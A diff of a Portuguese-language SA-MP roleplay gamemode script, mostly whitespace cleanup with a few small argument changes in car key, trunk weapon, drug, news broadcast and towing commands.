 	    new car = FindClosestVehicle(playerid);
 	    new found = 0;
-	    
+
 		if(pInfo[playerid][ChaveCarro1] == car || pInfo[playerid][ChaveCarro2] == car || pInfo[playerid][ChaveCarro3] == car || pInfo[playerid][ChaveCarro4] == car || pInfo[playerid][ChaveCarroEmp1] == car || pInfo[playerid][ChaveCarroEmp2] == car || pInfo[playerid][ChaveCarroEmp3] == car || pInfo[playerid][ChaveCarroEmp4] == car)
 		{
 		    found = 1;
@@ -17834,7 +17843,7 @@ COMMAND:trancar(playerid, params[], help)
 		{
 		    found = 1;
 		}
-		
+
 		if(found == 1)
 		{
 			if(cInfo[car][Trancado] == 0)
@@ -17864,7 +17873,7 @@ COMMAND:trancar(playerid, params[], help)
 		    cInfo[car][Trancado] = 0;
 		}
 }
-	
+
 	return 1;
 }
 
@@ -17873,7 +17882,7 @@ COMMAND:ajudacarro(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/trancar - /motor - /neon - /bagageira - /capo - /luzes - /deitarchavefora");
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/porarmacarro - /tirararmacarro - /verarmascarro - /travar");
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/ligarradio - /estacionar - /cinto - /emprestarchave - /retirarchave");
-	
+
 	return 1;
 }
 
@@ -17892,7 +17901,7 @@ COMMAND:deitarchavefora(playerid, params[], help)
 	    case 1:
 	    {
 	        if(pInfo[playerid][ChaveCarro1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");
-	        
+
 	        pInfo[playerid][ChaveCarro1] = 0;
 	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 1");
 	    }
@@ -17991,20 +18000,20 @@ COMMAND:retirarchave(playerid, params[], help)
 COMMAND:emprestarchave(playerid, params[], help)
 {
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
     new car = GetPlayerVehicleID(playerid);
-    
+
     if(cInfo[car][Type] != -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes dar a chave desse carro! Tipo inválido");
     if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o dono desse carro!");
 
 	new giveplayerid, string[128];
-	
+
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/emprestarchave <playerid>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(pInfo[giveplayerid][ChaveCarroEmp1] != 0 && pInfo[giveplayerid][ChaveCarroEmp2] != 0 && pInfo[giveplayerid][ChaveCarroEmp3] != 0 && pInfo[giveplayerid][ChaveCarroEmp4] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador tem as chaves emprestadas todas usadas!");
 	if(pInfo[giveplayerid][ChaveCarroEmp1] == car || pInfo[giveplayerid][ChaveCarroEmp2] == car || pInfo[giveplayerid][ChaveCarroEmp3] == car || pInfo[giveplayerid][ChaveCarroEmp4] == car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já tem essa chave!");
-	
+
 	if(pInfo[giveplayerid][ChaveCarroEmp1] == 0)
 	{
 	    pInfo[giveplayerid][ChaveCarroEmp1] = car;
@@ -18021,7 +18030,7 @@ COMMAND:emprestarchave(playerid, params[], help)
 	{
 	    pInfo[giveplayerid][ChaveCarroEmp4] = car;
 	}
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "entrega uma chave a");
 
     format(string, sizeof(string), "Deste uma cópia da chave do carro %d ao jogador %s", car, GetPlayerNameEx(giveplayerid));
@@ -18035,7 +18044,7 @@ COMMAND:emprestarchave(playerid, params[], help)
 COMMAND:cinto(playerid, params[], help)
 {
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
 	if(Cinto[playerid] == true)
 	{
  		PlayerActionMessage(playerid, 15.0, "clica no botão e tira o cinto de segurança.");
@@ -18053,13 +18062,13 @@ COMMAND:cinto(playerid, params[], help)
 COMMAND:estacionar(playerid, params[], help)
 {
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
     new car = GetPlayerVehicleID(playerid);
     new Float:cx, Float:cy, Float:cz, Float:angle, vw, interior, Float:hp;
     new engine, lights, alarm, doors, bonnet, boot, objective;
 
  	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
- 	
+
  	if(engine == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de desligar o motor para estacionares o carro!");
    	if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car && pInfo[playerid][ChaveCarroEmp1] != car && pInfo[playerid][ChaveCarroEmp2] != car && pInfo[playerid][ChaveCarroEmp3] != car && pInfo[playerid][ChaveCarroEmp4] != car)
 	{
@@ -18089,10 +18098,10 @@ COMMAND:estacionar(playerid, params[], help)
 	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
 	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
 	AtualizarDanosCarro(car);
-	AtualizarTunning(car); 
-	
+	AtualizarTunning(car);
+
 	SetVehicleHealth(car, hp);
-	
+
 	if(cInfo[car][IsCaravana] == 1 || cInfo[car][IsCaravana] == 2)
 	{
 		AtualizarCaravanaPos(car);
@@ -18139,7 +18148,7 @@ COMMAND:ligarradio(playerid, params[], help)
 	else
 	{
 		if(pObjects[playerid][Radio] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás tens nenhum rádio!");
-		
+
 		StopAudioStreamForPlayer(playerid);
 		SendClientMessage(playerid, COLOR_INFO, "Desligaste a música que estava a passar!");
 	}
@@ -18150,10 +18159,10 @@ COMMAND:ligarradio(playerid, params[], help)
 COMMAND:travar(playerid, params[], help)
 {
 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-	
+
 	new speed = GetPlayerSpeed(playerid);
 	new car = GetPlayerVehicleID(playerid);
-	
+
 	if(cInfo[car][Travao] == 0)
 	{
 		if(speed > 10) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes travar o carro, a tua velocidade é muito alta");
@@ -18161,18 +18170,18 @@ COMMAND:travar(playerid, params[], help)
 
 	    PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], COLOR_ERRO);
 	    PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]);
-	    
+
 	    PlayerActionMessage(playerid, 15.0, "puxa o travão de mão");
-	    
+
 	    cInfo[car][Travao] = 1;
 	}
 	else
 	{
 	    PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], -1);
 	    PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]);
-	    
+
 	    PlayerActionMessage(playerid, 15.0, "destrava o veículo");
-	
+
 	    cInfo[car][Travao] = 0;
 	}
 
@@ -18469,16 +18478,16 @@ COMMAND:verarmascarro(playerid, params[], help)
 	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
 
 	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
-	
+
 	new string[128];
-	
+
 	format(string, sizeof(string), "{FF9900}Arma 1: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma1]), cInfo[car][Ammo1]);
 	SendClientMessage(playerid, COLOR_CHAT, string);
 	format(string, sizeof(string), "{FF9900}Arma 2: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma2]), cInfo[car][Ammo2]);
 	SendClientMessage(playerid, COLOR_CHAT, string);
 	format(string, sizeof(string), "{FF9900}Arma 3: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma3]), cInfo[car][Ammo3]);
 	SendClientMessage(playerid, COLOR_WHITE, string);
-	
+
 	return 1;
 }
 
@@ -18492,12 +18501,12 @@ COMMAND:tirararmacarro(playerid, params[], help)
 	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
 
 	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
-	
+
 	new slot, string[128];
 
     if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tirararmacarro <slot (1-3)>");
     if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
-    
+
 	switch(slot)
 	{
 	    case 1:
@@ -18533,7 +18542,7 @@ COMMAND:tirararmacarro(playerid, params[], help)
 	}
 
 	PlayerActionMessage(playerid, 15.0, "tira uma arma de dentro da bagageira.");
-	
+
 	return 1;
 }
 
@@ -18547,15 +18556,15 @@ COMMAND:porarmacarro(playerid, params[], help)
 	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
 
 	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
-	
+
 	new slot, string[128];
 
     if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmacarro <slot (1-3)>");
     if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
-    
+
    	new arma = GetPlayerWeapon(playerid);
 	new ammo = GetPlayerAmmo(playerid);
-	
+
 	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
 	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");
 
@@ -18564,10 +18573,10 @@ COMMAND:porarmacarro(playerid, params[], help)
 	    case 1:
 	    {
 			if(cInfo[car][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");
-			
+
 			cInfo[car][Arma1] = arma;
 			cInfo[car][Ammo1] = ammo;
-			
+
 			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 1 do teu carro", GetWeapName(arma), ammo);
 	    }
 	    case 2:
@@ -18576,7 +18585,7 @@ COMMAND:porarmacarro(playerid, params[], help)
 
 			cInfo[car][Arma2] = arma;
 			cInfo[car][Ammo2] = ammo;
-			
+
 			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 2 do teu carro", GetWeapName(arma), ammo);
 	    }
 	    case 3:
@@ -18585,17 +18594,17 @@ COMMAND:porarmacarro(playerid, params[], help)
 
 			cInfo[car][Arma3] = arma;
 			cInfo[car][Ammo3] = ammo;
-			
+
 			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 3 do teu carro", GetWeapName(arma), ammo);
 	    }
 	}
-	
+
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
 	RemovePlayerWeapon(playerid, arma);
 
 	PlayerActionMessage(playerid, 15.0, "põe uma arma na bagageira do carro.");
-	
+
 	return 1;
 }
 
@@ -18606,11 +18615,11 @@ COMMAND:bagageira(playerid, params[], help)
     if(IsPlayerInAnyVehicle(playerid))
     {
 		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o condutor do carro!");
-		
+
         new car = GetPlayerVehicleID(playerid);
-        
+
 		GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
-	
+
 		if(porma == VEHICLE_PARAMS_OFF)
 		{
 	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_ON, ob);
@@ -18625,15 +18634,15 @@ COMMAND:bagageira(playerid, params[], help)
 	else
 	{
 	    new car = FindClosestVehicle(playerid);
-	    
+
 		if(car == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto de nenhum veículo!");
-		
+
 		GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
-		
+
  		if(porma == VEHICLE_PARAMS_OFF)
 		{
 		    if(cInfo[car][Trancado] == 1) return GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
-		    
+
 	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_ON, ob);
 	    	PlayerActionMessage(playerid, 15.0, "abre a bagageira do veículo.");
 		}
@@ -18698,7 +18707,7 @@ COMMAND:capo(playerid, params[], help)
 COMMAND:neon(playerid, params[], help)
 {
 	new car = GetPlayerVehicleID(playerid);
-	
+
 	if(cInfo[car][Neon] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens neons!");
 
     if(NeonLigado[car] == false)
@@ -18712,7 +18721,7 @@ COMMAND:neon(playerid, params[], help)
 			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
 
 	  		PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");
-	  		
+
 	  		NeonLigado[car] = true;
 
 			return 1;
@@ -18724,9 +18733,9 @@ COMMAND:neon(playerid, params[], help)
 
 			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
 			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
-			
+
 			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");
-			
+
 			NeonLigado[car] = true;
 		}
 		else if(cInfo[car][Neon] == NEON_BRANCO)
@@ -18782,9 +18791,9 @@ COMMAND:neon(playerid, params[], help)
 	{
  		DestroyObject(neon[car][0]);
 		DestroyObject(neon[car][1]);
-		
+
   		NeonLigado[car] = false;
-  		
+
     	PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e desliga os neons do veículo.");
 	}
 
@@ -18793,7 +18802,7 @@ COMMAND:neon(playerid, params[], help)
 
 COMMAND:estatisticas(playerid, params[], help)
 {
-	ShowStats(playerid, playerid, 0);
+	ShowStats(playerid, playerid);
 
 	return 1;
 }
@@ -18806,7 +18815,7 @@ COMMAND:tomarmedicamentos(playerid, params[], help)
 
 	pInfo[playerid][Medicamentos] = 0;
 	pInfo[playerid][MedicamentosTomados] = 1;
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Tomaste os medicamentos.");
 
 	return 1;
@@ -18834,14 +18843,14 @@ COMMAND:fabricararma(playerid, params[], help)
 	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/vendermateriais <playerid> <weap id>");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Weap Id's]: {FFFFFF}1: Faca (1) - 2: Katana (2) - 3: 9mm (3) - 4: 9mm c/Silenciador (4) - 5: Deagle (5) - 6: Shotgun (6)");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Weap Id's]: {FFFFFF}7: MP5 (8) - 8: AK-47 (10) - 9: Gés Pimenta (1)");
-	    
+
 	    return 1;
 	}
 
     if(weapid <= 0 || weapid > 9) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
-    
+
     new materiaiscusto, nomearma[32], arma;
-    
+
     switch(weapid)
     {
         case 1: { materiaiscusto = 1; nomearma = GetWeapName(4); arma = 4; }
@@ -18942,7 +18951,7 @@ COMMAND:venderdroga(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O jogador %s vendeu-te %d drogas.", GetPlayerNameEx(playerid), qtd);
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "pega num pacote e passa-o sem dar nas vistas a");
 
 	return 1;
@@ -18953,20 +18962,20 @@ COMMAND:comprardroga(playerid, params[], help)
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_DROGAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
 	if(!IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][ComprarDrogasX], oInfo[0][ComprarDrogasY], oInfo[0][ComprarDrogasZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no lugar de comprar droga");
-	
+
 	new qtd, montante, string[128];
-	
+
     if(sscanf(params, "d", qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprardroga <quantidade>");
-    
+
     montante = qtd*PRECO_DROGA;
-    
+
 	if(qtd <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");
 	if(GetPlayerMoneyEx(playerid) < montante) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	
+
 	GivePlayerMoneyEx(playerid, -montante);
-	
+
 	pInfo[playerid][PreDrogas] += qtd;
-	
+
 	format(string, sizeof(string), "Compraste %d gramas de droga. Custou-te: %d$. Para a venderes tens de a entregar. Tens agora: %d pré-drogas.", qtd, montante, pInfo[playerid][PreDrogas]);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -19011,7 +19020,6 @@ COMMAND:parartransmissao(playerid, params[], help)
 
 	foreach(new i : Player)
 	{
-		// if(!IsPlayerConnected(i)) continue;
 		if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
 		if(IsPlayerInAnyVehicle(i))
 		{
@@ -19042,10 +19050,9 @@ COMMAND:transmitir(playerid, params[], help)
 	    case 1:
 	    {
 	        format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica1Nome]);
-	        
+
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19055,17 +19062,16 @@ COMMAND:transmitir(playerid, params[], help)
 
 				StopAudioStreamForPlayer(i);
 				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica1]);
-				
+
 				SendClientMessage(i, COLOR_NEWS, string);
     		}
 	    }
 	    case 2:
 	    {
             format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica2Nome]);
-            
+
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19082,10 +19088,9 @@ COMMAND:transmitir(playerid, params[], help)
 	    case 3:
 	    {
             format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica2Nome]);
-            
+
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19105,7 +19110,6 @@ COMMAND:transmitir(playerid, params[], help)
 
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19125,7 +19129,6 @@ COMMAND:transmitir(playerid, params[], help)
 
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19145,7 +19148,6 @@ COMMAND:transmitir(playerid, params[], help)
 
          	foreach(new i : Player)
     		{
-        		// if(!IsPlayerConnected(i)) continue;
 				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
 				if(IsPlayerInAnyVehicle(i))
 				{
@@ -19176,7 +19178,7 @@ COMMAND:editarmusica(playerid, params[], help)
 
 	if(sscanf(params, "ds[128]s[32]", numero, link, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/editarmusica <número> <link> <nome>");
 	if(numero < 1 || numero > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Número inválido! (1-6)");
-	
+
 	switch(numero)
 	{
 	    case 1:
@@ -19216,7 +19218,7 @@ COMMAND:editarmusica(playerid, params[], help)
 	    	oInfo[0][NewsMusica6Nome] = nome;
 	    }
 	}
-	
+
 	format(string, sizeof(string), "Alteraste a música %d para o nome %s com o link '%s'.", numero, nome, link);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -19229,7 +19231,7 @@ COMMAND:musicaslista(playerid, params[], help)
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
 
 	new string[128];
-	
+
 	format(string, sizeof(string), "[MÚSICA 1:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica1Nome], oInfo[0][NewsMusica1Alterador]);
 	SendClientMessage(playerid, COLOR_NEWS, string);
 	format(string, sizeof(string), "[MÚSICA 2:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica2Nome], oInfo[0][NewsMusica2Alterador]);
@@ -19250,9 +19252,9 @@ COMMAND:noticias(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
+
  	AEntrevistar[playerid] = true;
-	    
+
 	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Notícias ]_____________________________________");
 	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
 
@@ -19263,7 +19265,7 @@ COMMAND:pararnoticias(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
+
  	AEntrevistar[playerid] = false;
 
 	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
@@ -19277,7 +19279,7 @@ COMMAND:entrevistar(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
+
 	new giveplayerid, string[128];
 
 	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/entrevistar <playerid>");
@@ -19299,19 +19301,17 @@ COMMAND:pararentrevista(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
+
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
-
 		Entrevista[i] = false;
 		EntrevistadorID[i] = INVALID_PLAYER_ID;
 		ASerEntrevistado[i] = false;
 		AEntrevistar[i] = false;
     }
-    
+
     SendClientMessage(playerid, COLOR_CHAT, "[NEWS:] {FFFFFF}Acabaste a entrevista!");
-    
+
 	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
 	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Entrevista ]_____________________________________");
 
@@ -19374,14 +19374,14 @@ COMMAND:imposto(playerid, params[], help)
 	if(pInfo[playerid][FactionRank] != 1 && pInfo[playerid][FactionRank] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Rank inválido");
 
 	new sdialog[512];
-	
+
 	format(sdialog, sizeof(sdialog),
 	"Nome\tMontante Atual\n\
 	Imposto Geral\t$%d\n\
 	Imposto Automóvel\t$%d\n\
 	Imposto sobre Propriedades\t$%d\n\
 	Imposto sobre Negócios\t$%d", oInfo[0][Impostos], oInfo[0][ImpostoCarros], oInfo[0][ImpostoCasas], oInfo[0][ImpostoLojas]);
-	
+
 	ShowPlayerDialog(playerid, DIALOG_IMPOSTO_MENU, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}IMPOSTOS", sdialog, "Selecionar", "Sair");
 
     return 1;
@@ -19456,14 +19456,14 @@ COMMAND:soro(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
     new Float:x, Float:y, Float:z;
-    
+
     TogglePlayerControllable(playerid, true);
 
 	GetPlayerPos(giveplayerid, x, y, z);
-    SetPlayerHealthEx(playerid, 50, 0);
-    
-    SetPlayerPosEx(giveplayerid, x, y, z);
-	
+    SetPlayerHealthEx(playerid, 50, HEALTH_SET);
+
+    SetPlayerPosEx(giveplayerid, x, y, z, -1, -1);
+
 	pInfo[giveplayerid][Morto] = 0;
 	pInfo[giveplayerid][MorteX] = 0;
 	pInfo[giveplayerid][MorteY] = 0;
@@ -19473,7 +19473,7 @@ COMMAND:soro(playerid, params[], help)
 
     format(string, sizeof(string), "Deste soro ao jogador %s", GetPlayerNameEx(giveplayerid));
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
     PlayerActionMessage(playerid, 15.0, "aplica soro no paciente.");
 
     GameTextForPlayer(giveplayerid, "~r~Foste curado", 2000, 3);
@@ -19492,7 +19492,7 @@ COMMAND:passarreceita(playerid, params[], help)
 	{
 	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/passarreceita <playerid> <medicamento> <preço>");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Medicamentos]: {FFFFFF}1: Gripe - 2: Infeção Urinária - 3: Dores de Barriga - 4: Ataques de Tosse");
-	    
+
 		return 1;
 	}
 
@@ -19511,7 +19511,7 @@ COMMAND:passarreceita(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O mecânico %s ofereceu-te uma receita médica por %d$. (/aceitarreceita)", GetPlayerNameEx(playerid), montante);
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "assina a receita médica e entraga-a a");
 
     return 1;
@@ -19557,24 +19557,24 @@ COMMAND:rebocar(playerid, params[], help)
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
 
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
     new car = GetPlayerVehicleID(playerid);
     new model = GetVehicleModel(car);
-    
+
     if(model != 525) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num reboque");
-    
+
 	new Float:pX,Float:pY,Float:pZ;
 	GetPlayerPos(playerid,pX,pY,pZ);
 	new Float:veX,Float:veY,Float:veZ;
-	new Found=0;
-	new vid=0;
+	new Found = 0;
+	new vid = 0;
 	while((vid<MAX_CARROS)&&(!Found))
 	{
 		vid++;
 		GetVehiclePos(vid,veX,veY,veZ);
 		if ((floatabs(pX-veX)<7.0)&&(floatabs(pY-veY)<7.0)&&(floatabs(pZ-veZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
 		{
-			Found=1;
+			Found = 1;
 			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
 			{
 				DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
